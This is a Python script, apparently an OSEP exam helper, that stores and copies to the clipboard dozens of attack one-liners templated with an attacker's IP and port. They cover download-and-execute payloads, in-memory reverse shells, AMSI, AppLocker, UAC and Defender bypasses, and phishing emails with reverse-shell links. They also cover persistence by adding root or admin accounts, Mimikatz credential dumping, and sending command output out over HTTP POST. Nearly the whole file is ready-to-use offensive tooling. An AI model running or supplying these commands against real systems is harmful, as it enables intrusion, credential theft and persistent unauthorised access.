#!/usr/bin/python3

import argparse
import pyperclip
import base64

def main():

    args = parse_arguments()

    templates = {
        "enumeration": {
            "laps": [
                "Show LAPS information",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/LAPSToolkit.ps1') | IEX ; Get-LAPSComputers ; Find-LAPSDelegatedGroups ; Find-AdmPwdExtendedRights",
            ],
            "applocker": [
                "Show the effective Applocker rules",
                "get-applockerpolicy -effective ; get-applockerpolicy -effective | select -ExpandProperty RuleCollections ;get-applockerpolicy -effective -xml\n\nCopy to VSCode and format"
            ],
            "av-status": [
                "Show status of AV",
                "Get-MpComputerStatus | Select-Object -Property Antivirusenabled,AMServiceEnabled,AntispywareEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,OnAccessProtectionEnabled,RealTimeProtectionEnabled,IsTamperProtected,AntivirusSignatureLastUpdated",
            ],
            "pspy" : [
                "Linux process monitoring",
                f"curl http://{args.ip}:{args.port}/ps/pspy64 -o ./pspy64 ; chmod +x ./pspy64 ; ./pspy64"
            ],
            "av-exclusions": [
                "Show the whitelisted paths for AV",
                "reg.exe query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Microsoft Antimalware\\Exclusions\\Paths\""
            ],
            "test-amsi": [
                "Test AMSI, is it on?",
                "'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'",
            ],
            "test-clm": [
                "Show the PowerShell language mode",
                "$ExecutionContext.SessionState.LanguageMode",
            ],            
            "nmap": [
                "Scan scope.txt",
                "mkdir nmap ; sudo nmap -v -Pn -sT -sV -O -sC -p- -iL scope.txt -oA nmap/all-port-service-os-script",
            ],
            "cmd-or-ps": [
                "Am I in CMD or PS?",
                "(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell",
            ],
        },
        "payload": {
            "run.txt": [
                "Download and execute a PowerShell payload",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/pl/isma1.txt') | IEX ; (New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/pl/run.txt') | IEX",
            ],
            "ref-pe-exe": [
                "Download and execute .EXE revshell in-memory",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/Invoke-ReflectivePEInjection.ps1') | IEX ; Invoke-ReflectivePEInjection -PEBytes (New-Object System.Net.WebClient).DownloadData('http://{args.ip}:{args.port}/pl/exec-revshell.exe') -ProcId (Get-Process -Name explorer).Id",
            ],
            "ref-assam-dll": [
                "Download and execute .DLL revshell in-memory",
                f"$data = (New-Object System.Net.WebClient).DownloadData('http://{args.ip}:{args.port}/pl/dll-revshell.dll') ; $assem = [System.Reflection.Assembly]::Load($data) ; $class = $assem.GetType('dll_revshell.Class1') ; $method = $class.GetMethod('runner') ; $method.Invoke(0, $null)",
            ],
            "ref-assam-exe": [
                "Download and inject .EXE revshell in-memory",
                f"$data = (New-Object System.Net.WebClient).DownloadData('http://{args.ip}:{args.port}/pl/{args.file}') ; $assem = [System.Reflection.Assembly]::Load($data) ; [{args.file.replace('.exe', '')}.Program]::Main(\"COMMAND-HERE\".Split())",
            ],
            "jscript": [
                "Generate demon.js used for HTA and XSL",
                f".\\DotNetToJScript.exe Z:\\source\\dll-revshell\\bin\\x64\\Release\\dll-revshell.dll --lang=Jscript --ver=v4 -o Z:\\DotNetToJscript\\demon.js",
            ],
            "mshta": [
                "Download and run a revshell using MSHTA (CLM bypass)",
                f"cmd.exe /c mshta.exe http://{args.ip}:{args.port}/pl/js-revshell.hta",
            ],
            "xsl": [
                "Download and run a revshell using XSL (CLM bypass)",
                f'cmd.exe /c wmic process get brief /format:"http://{args.ip}:{args.port}/pl/js-revshell.xsl"',
            ],
            "dll" : [
                "Execute a .DLL",
                "rundll32 C:\\Tools\\met.dll,run"
            ],
            "elf" : [
                "Download and drop a revshell (.ELF)",
                f"curl http://{args.ip}:{args.port}/pl/li-rshell.elf -o ./li-rshell.elf"
            ],
            "elf-reflect":[
                "Download  and execute an ELF in-memory",
                "fee rshell > /home/tijmen/pen300/www/pl/demon.py \ncurl http://{args.ip}:{args.port}/pl/demon.py | python"
            ],
            "so-libpath" : [
                "Download and drop a revshell (.SO) for LD_LIBRARY_PATH vulns",
                f"curl http://{args.ip}:{args.port}/pl/li-rshell.so -o ./li-rshell.so"
            ],
            "so-preload" : [
                "Download and drop a revshell (.SO) for LD_PRELOAD vulns",
                f"curl http://{args.ip}:{args.port}/pl/evil_{args.file} -o ./evil_{args.file}"
            ],
            "send-hta": [
                "Send a .HTA payload over E-mail", 
                f"swaks --to REPLACE@ME.com --from yeri@foobar.com --server {args.target} --header \"Subject: Link to CV\" --body \"Click me: http://{args.ip}:{args.port}/pl/js-revshell.hta\""
            ],
            "send-xsl": [
                "Send a .XSL payload over E-mail",
                f"swaks --to REPLACE@ME.com --from yeri@foobar.com --server {args.target} --header \"Subject: Link to CV\" --body \"Click me: http://{args.ip}:{args.port}/pl/js-revshell.xsl\""
            ]
        },
        "bypass": {
            "disable-av": [
                "Disable MS Defender (admin needed)",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/Disable-AV.ps1') | IEX",
            ],
            "uninstall": [
                "Bypasses CLM and AppLocker using the uninstall-method",
                f"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=true /interactive=true /U .\\uninstall-bypass.exe",
            ],
            "bypass-amsi": [
                "Bypass AMSI",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/pl/isma1.txt') | IEX",
            ],
            "bypass-clm": [
                "Set the PowerShell language mode",
                "$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'",
            ],
            "bypass-hta": [
                "Bypass AWL using HTA",
                "mshta.exe bypass.hta\n\n<html>\n<head>\n<script language=\"JScript\">\n    var shell = new ActiveXObject(\"WScript.Shell\");\n    var res = shell.Run(\"{args.file}\");\n</script>\n</head>\n<body>\n<script language=\"JScript\">\nself.close();\n</script>\n</body>\n</html>"
            ],
            "bypass-xsl":[
                "Bypass AWL using XSL",
                f"Run on Kali:\nvim /www/pl/bypass.xsl\n\nwmic process get brief /format:\"http://{args.ip}:{args.port}/pl/bypass.xsl\""
            ],
            "bypass-cs": [
                "Bypass AWL using C# compilation (doesnt work?)",
                "$pathvar = \".\\bypass.txt\" ; $workflowexe = \"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe\" ; $workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe) ; $SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static') ; Add-Type -Path 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\System.Workflow.ComponentModel.dll' ; $compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters ; $compilerparam.GenerateInMemory = $True ; $output = \".\\bypass.xml\" ; del $output ; $tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar))) ; Move-Item $tmp $output ; C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe .\\bypass.xml .\\out.log\n\n$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(\"USERREPLACE\",\"FullControl\",\"none\",\"none\",\"Allow\");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl\n\nusing System;\nusing System.Diagnostics;\nusing System.Workflow.ComponentModel;\npublic class Run : Activity{\n    public Run() {\n        ProcessStartInfo startInfo = new ProcessStartInfo\n        {\n            FileName = @\"C:\\Windows\\System32\\cmd.exe\",\n            Arguments = @\"/k whoami\",\n            RedirectStandardOutput = true,\n            UseShellExecute = false,\n            CreateNoWindow = true\n        };\n\n        using (Process process = new Process { StartInfo = startInfo })\n        {\n            process.Start();\n            process.WaitForExit();\n        }\n    }\n}"
            ],
            "sharpbypassuac": [
                "Bypass UAC using varias methods",
                f"Invoke-Webrequest -Uri http://{args.ip}:{args.port}/pe/SharpBypassUAC.exe -Outfile .\\SharpBypassUAC.exe ; .\\SharpBypassUAC.exe -b eventvwr -e Y21kIC9jIHN0YXJ0IHJ1bmRsbDMyIGM6XHVzZXJzXHB1YmxpY1xiZWFjb24uZGxsLFVwZGF0ZQ=="
            ],
            "fod-helper": [
                "Bypass UAC using FOD-helper",
                "$cmd = \"cmd /c start powershell.exe\" ; New-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force ; New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force ; Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value $cmd -Force ; Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden ; Start-Sleep 3 ; Remove-Item \"HKCU:\\Software\\Classes\\ms-settings\" -Recurse -Force"
            ],
            "eventviewer": [
                "Bypass UAC using EventViwer",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/Invoke-Eventviewer.ps1') | IEX; Invoke-EventViewer cmd.exe"
            ]
        },
        "privesc": {
            "powerup": [
                "Windows PrivEsc enumeration",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/PowerUp.ps1') | IEX; Invoke-AllChecks | Out-File -FilePath .\\powerup.txt",
            ],
            "jaws": [
                "Windows PrivEsc enumeration",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/jaws.ps1') | IEX | Out-File -FilePath .\\jaws.txt",
            ],
            "winpeas": [
                "Windows PrivEsc enumeration",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/winPEAS.ps1') | IEX | Out-File -FilePath .\\winpeas.txt",
            ],
            "linpeas": [
                "Linux PrivEsc enumeration",
                f"curl http://{args.ip}:{args.port}/ps/linpeas.sh | sh | tee ./linpeas.txt",
            ],
            "privesc-meterpreter": [
                "Multi PrivEsc enumeration",
                "run multi/recon/local_exploit_suggester"
            ],
            "weak-serv-perms": [
                "PrivEsc through weak service permissions",
                "Invoke-ServiceAbuse -Name \"VulnerableSvc\" -Command \"net localgroup Administrators DOMAIN\\user /add\" ; net.exe stop VulnerableSvc ; net.exe start VulnerableSvc"
            ],
            "unquoted-serv-path": [
                "PrivEsc through unqouted service path",
                "Write-ServiceBinary -Name 'VulnerableSvc' -Command 'c:\\windows\\system32\\rundll32 c:\\Users\\Public\\beacon.dll,Update' -Path 'C:\\Program Files\\VulnerableSvc'; net.exe stop VulnerableSvc ; net.exe start VulnerableSvc"
            ]
        },
        "lateral": {
            "powerupsql": [
                "MSSQL exploitation tool (.PS1)",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/PowerUpSQL.ps1') | IEX",
            ],
            "sqlrecon": [
                "MSSQL exploitation tool (.EXE)",
                f"Invoke-Webrequest -Uri http://{args.ip}:{args.port}/pe/SQLRecon.exe -Outfile SQLRecon.exe",
            ],
            "sqlexec": [
                "MSSQL exploitation tool (.EXE)",
                f"Invoke-Webrequest -Uri http://{args.ip}:{args.port}/pe/sqlexec.exe -Outfile sqlexec.exe",
            ],
            "latexec": [
                "Fileless PsExec",
                f'.\\latexec.exe {args.target} SensorService "ping.exe {args.ip}"',
            ],
            "sharprdp": [
                "Execute single commands through RDP (PsExec-like)",
                f'.\\SharpRDP.exe computername={args.target} command="ping {args.ip}" username=corp\\admin password=lab',
            ],
            "rdpthief-run": [
                "Keylogger for RDP-processes",
                ".\\rdpthief.exe C:\\Users\\offsec\\Music\\RdpThief.dll",
            ],
            "rdpthief-show": [
                "Show captured data, number can vary",
                "C:\\Users\\offsec\\AppData\\Local\\Temp\\1\\data.bin",
            ],
            "spoolerscan": [
                "Scan a system for spoolss service",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/SpoolerScan.ps1') | IEX ; Invoke-Scan -ipaddress {args.target}",
            ],
            "ligolo-win": [
                "Download ligolo for Windows",
                f"Invoke-WebRequest -Uri http://{args.ip}:{args.port}/pe/ligolo.exe -OutFile .\\ligolo.exe; Invoke-WebRequest -Uri http://{args.ip}:{args.port}/pe/wintun.dll -OutFile .\\wintun.dll\n.\\ligolo.exe -connect {args.ip}:11601 -ignore-cert"
            ],
            "ligolo-lin": [
                "Download ligolo for Linux",
                f"curl http://{args.ip}:{args.port}/pe/ligolo.elf -o ./ligolo.elf; chmod +x ./ligolo.elf\n./ligolo.elf -connect {args.ip}:11601 -ignore-cert"
            ],
            "ligolo-reflect":[
                "Load Ligolo into memory for Windows",
                f"Run on Kali:\ndonut -f 1 -o /home/tijmen/pen300/www/pe/ligolo.bin -a 2 -p \"-connect {args.ip}:11601 -ignore-cert\" -i /home/tijmen/pen300/www/pe/ligolo.exe ; sed -i 's/[0-9]\\{{1,3\\}}\\.[0-9]\\{{1,3\\}}\\.[0-9]\\{{1,3\\}}\\.[0-9]\\{{1,3\\}}:[0-9]\\{{1,5\\}}/{args.ip}:{args.port}/g' /www/ps/Ligolo-AppLockerBypass.ps1\n\nIEX(new-object system.net.webclient).downloadstring('http://{args.ip}:{args.port}/ps/Ligolo-AppLockerBypass.ps1')"
            ],
            "lat-meterpreter":[
                "Spawn a meterpreter without a double hop issue",
                f"nxc smb {args.target} -u USERREPLACE -H HASHREPLACE -d DOMAINREPLACE -X \"[run.txt here]\""
            ],
            "ps-history": [
                "Show the PowerShell history of a user",
                "C:\\Users\\[REPLACEME]\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
            ],
            "powerupsql-commands": [
                "RCE commands with PowerUpSQL",
                f"Get-SQLServerLinkCrawl -Username USERREPLACE -Password PASSREPLACE -QueryTarget [REPLACE: \"SQL27\\SQLEXPRESS\"] -Query \"EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c ping {args.ip}';\"\n\nGet-SQLServerLinkCrawl -Username USERREPLACE -Password PASSREPLACE -QueryTarget [REPLACE: \"SQL27\\SQLEXPRESS\"] -Query \"EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'ping {args.ip}'\""
            ],
        },
        "active directory": {
            "powerview": [
                "Manual domain enumeration",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/PowerView.ps1') | IEX",
            ],
            "sharphound": [
                "Automatic domain enumeration",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/SharpHound.ps1') | IEX ; Invoke-BloodHound -CollectionMethod All",
            ],
            "powermad": [
                "Exploiting ms-DS-MachineAccountQuota",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/Powermad.ps1') | IEX"
            ],
            "rubeus": [
                "In-memory Keberos toolset",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/Invoke-Rubeus.ps1') | IEX ; Invoke-Rubeus"
            ],
        },
        "persistance": {
            "add-sshkey": [
                "Add pubkey to authorized_keys",
                "mkdir ~/.ssh/ ; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIbI6f5vDmSzXBNY150yIf3rJG0fR9YNaHT+UIPNLxTF tijmen@NX-76884\" >> ~/.ssh/authorized_keys"
            ],
            "rdp-enable": [
                "Enable RDP on the system",
                "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
            ],
            "rdp-hash-enable": [
                "Enable PtH RDP(admin needed)",
                'New-ItemProperty -Path "HKLM:\\System\\CurrentControlSet\\Control\\Lsa" -Name DisableRestrictedAdmin -Value 0',
            ],
            "rdp-hash-connect": [
                "Connect PtH RDP",
                f"xfreerdp /u:administrator /pth:REPLACEME /v:{args.target} /size:1920x1080 /cert-ignore",
            ],
            "add-yeri-win": [
                "Add Yeri as local admin",
                'net user yeri P@ssw0rd /add ; net localgroup administrators yeri /add ; net localgroup "remote desktop users" yeri /add',
            ],
            "add-yeri-lin": [
                "Add Yeri as local admin (P@ssw0rd)",
                'echo "yeri:LhIg9GYHAJboc:0:0:root:/root:/bin/bash" >> /etc/passwd',
            ],
        },
        "loot": {
            "mimikatz": [
                "Credential exploitation (.EXE)",
                f"Invoke-Webrequest -Uri http://{args.ip}:{args.port}/pe/mimikatz.exe -Outfile mimikatz.exe",
            ],
            "invoke-mimikatz": [
                "Credential exploitation (.PS1)",
                f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/ps/Invoke-Mimikatz.ps1') | IEX ; Get-Help Invoke-Mimikatz",
            ],
            "mimikatz-commands": [
                "General MimiKatz commands",
                "Upload mimidrv.sys!\nprivilege::debug\n!+\n!processprotect /process:lsass.exe /remove\nsekurlsa::logonpasswords\nlsadump::lsa /patch\nlsadump::sam\nlsadump::dcsync /user:DOMAIN\\krbtgt /domain:targetdomain.com\nvault::list\nvault::cred /patch"
            ],
            "interesting-files": [
                "List of interesting Windows files",
                "tree /f /a C:\\Users\nC:\\inetpub\\www\\*\\web.config\nC:\\Windows\\Panther\\Unattend.xml\nC:\\ProgramData\\Configs\\\nC:\\Program Files\\Windows PowerShell\\\nC:\\Users\\[USERNAME]\\AppData\\LocalLow\\Microsoft\\Putty\nC:\\Users\\[USERNAME]\\AppData\\Roaming\\FileZilla\\FileZilla.xml\nC:\\Program Files\\Jenkins\\credentials.xml\nC:\\ProgramData\\Microsoft\\Wlansvc\\Profiles\\*.xml\nGet-ItemProperty -Path HKLM:\\Software\\TightVNC\\Server -Name \"Password\" | select -ExpandProperty Password\n"
            ],
        },
        # Deprecated, use resources instead
        "metasploit": {
            "metasploit32": [
                "Startup and run",
                "Deprecated, use resources instead\nsudo msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; run -j\"",
            ],
            "metasploit64": [
                "Startup and run",
                "Deprecated, use resources instead\nsudo msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; run -j\"",
            ],
            "migrate32": [
                "Startup and run with auto migrate",
                "Deprecated, use resources instead\nsudo msfconsole -q -x \"use multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; set AutoRunScript /home/tijmen/pen300/tools/migrate_explorer.rc; run -j\"",
            ],
            "migrate64": [
                "Startup and run with auto migrate",
                "Deprecated, use resources instead\nsudo msfconsole -q -x \"use multi/handler; set payload windows/x64/meterpreter/reverse_winhttps; set lhost tun0; set lport 443; set AutoRunScript /home/tijmen/pen300/tools/migrate_explorer.rc; run -j\"",
            ],
        },
        "others": {
            "prefix": [
                "PowerShell prefixes",
                "powershell -nop -ep bypass -enc <COMMAND>\npowershell -nop -ep bypass -c <COMMAND>",
            ],
            "stomp-word": [
                "Stomping MS-Word",
                ".\\EvilClippy.exe -s fakecode.vba macrofile.doc",
            ],
            "postbody": [
                "Extract command output via HTTP POST",
                f"Invoke-WebRequest -Uri http://{args.ip}:{args.port}/extract -Method post -Body (whoami) -Timeoutsec 2",
            ],
            "bits-transfer": [
                "Download a file with base64 content using BITS, after run it using the uninstall-method",
                f"bitsadmin /Transfer myJob http://{args.ip}:{args.port}/pe/{args.file} C:\\users\\student\\enc.txt && certutil -decode C:\\users\\student\\enc.txt C:\\users\\student\\{args.file} && del C:\\users\\student\\enc.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=true /U C:\\users\\student\\{args.file}",
            ],
            "search": [
                "Search for a string in Windows",
                'Get-ChildItem -Path C:\\ -Include .config,.txt,.xml,.ini  -File -Recurse -ErrorAction SilentlyContinue | select-string -Pattern "REPLACEME"',
            ],
            "compile-old-gcc": [
                "Compile C-code using an old compiler",
                "docker run --rm -v \"$PWD\":/usr/src/myapp -w /usr/src/myapp gcc:4.9 gcc -z execstack -o evil.elf elf-revshell.c"
            ],
            "improve-shell": [
                "Improve a Linux shell",
                "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
            ],
            "monitor-file": [
                "Replacement for the watch command",
                "while true; do if [ \"$(ls -A | wc -l)\" -gt 0 ]; then break; else date; sleep 5; fi; done"
            ],
            "proxy-aware": [
                "PowerShell download through a Proxy",
                f"Disable Proxy: $wc.proxy = $null\n\nNew-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null ; $keys = Get-ChildItem 'HKU:' ; ForEach ($key in $keys) {{if ($key.Name -like \"*S-1-5-21-*\") {{$start = $key.Name.substring(10);break}}}} ; $proxyAddr=(Get-ItemProperty -Path \"HKU:$start\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\").ProxyServer ; [system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy(\"http://$proxyAddr\") ; $wc = new-object system.net.WebClient ; Write-Host '$wc.proxy = $null' ; $wc.Headers.Add('User-Agent', \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0\") ; $wc.DownloadString(\"http://{args.ip}:{args.port}/run.txt\") | IEX"
            ],
            "double-hop": [
                "Double hop can be fixed when you have the users password",
                "Spawn a meterpreter using NXC SMB or...\n$SecPassword = ConvertTo-SecureString 'PASSWDREPLACE' -AsPlainText -Force ; $Cred = New-Object System.Management.Automation.PSCredential('DOMAINREPLACE\\USERREPLACE', $SecPassword); Get-DomainGroup -Identity \"Domain Admins\" -Credential $Cred -Domain DOMAINREPLACE -Verbose"
            ],
            "dll-load": [
                "Load a .DLL into memory",
                "Import-Module .\\Microsoft.ActiveDirectory.Management.dll"
            ],
            "notes": [
                "General notes",
                "` escapes \"\nInvoke-RestMethod (irm) can replace iwr"
            ]
        },
        # Doesn't work?
        # "reflect-pe-dll": [
        #     "Download and execute",
        #     f"(New-Object System.Net.WebClient).DownloadString('http://{args.ip}:{args.port}/Invoke-ReflectivePEInjection.ps1') | IEX ; Invoke-ReflectivePEInjection -PEBytes (New-Object System.Net.WebClient).DownloadData('http://{args.ip}:{args.port}/dll-revshell.dll') -ProcId (Get-Process -Name explorer).Id",
        # ],
    }

    if args.list:
        for category, commands in templates.items():
            print(f"{category}:")
            if isinstance(commands, dict):
                for cmd, description in commands.items():
                    print(f"        {cmd.ljust(20)}: {description[0]}")
            else:
                print(f"    {commands[0]}")
        return
    elif args.all:
        for category, commands in templates.items():
            print(f"{category}:")
            if isinstance(commands, dict):
                for cmd, description in commands.items():
                    print(
                        f"        {cmd.ljust(20)}: {description[0]}\n        {description[1]}\n"
                    )
            else:
                print(f"    {commands[0]}")
        return

    try:
        oneliner = find_command(templates, args.cmd)
        command = oneliner[1]
    except:
        print("Command not found.")
        quit()

    if args.enc:
        encoded = encode_powershell_command(command)
        copy_to_clipboard(encoded)
        print(command)
        print(encoded)
    else:
        copy_to_clipboard(command)
        print(command)


def parse_arguments():
    parser = argparse.ArgumentParser(description="Oneliners and commands for OSEP")
    parser.add_argument("--cmd", "-c", help="Command to show")
    parser.add_argument("--ip", "-i", help="IP address of Kali")
    parser.add_argument("--port", "-p", default="80", help="Port number of Kali")
    parser.add_argument("--file", "-f", default="<STRINGREPLACE>", help="Filename or a string")
    parser.add_argument("--target", "-t", default="<TARGETREPLACE>", help="Target system")
    parser.add_argument("--list", "-l", action="store_true", help="List the commands with descriptions")
    parser.add_argument("--all", "-a", action="store_true", help="Print everything")
    parser.add_argument("--enc", "-e", action="store_true", help="Apply PS base64")

    args = parser.parse_args()
    if not args.list and not args.all and not args.cmd:
        parser.error("--cmd is required unless --list or --all is provided")

    return args


def find_command(templates, cmd):
    for key, value in templates.items():
        if key == cmd:
            return value
        if isinstance(value, dict):
            found = find_command(value, cmd)
            if found:
                return found
    return None


def encode_powershell_command(command):
    command_bytes = command.encode("utf-16le")
    encoded_command = base64.b64encode(command_bytes)
    encoded_command_str = encoded_command.decode("utf-8")

    return encoded_command_str


def copy_to_clipboard(text):
    pyperclip.set_clipboard("xclip")
    pyperclip.copy(text)


if __name__ == "__main__":
    main()
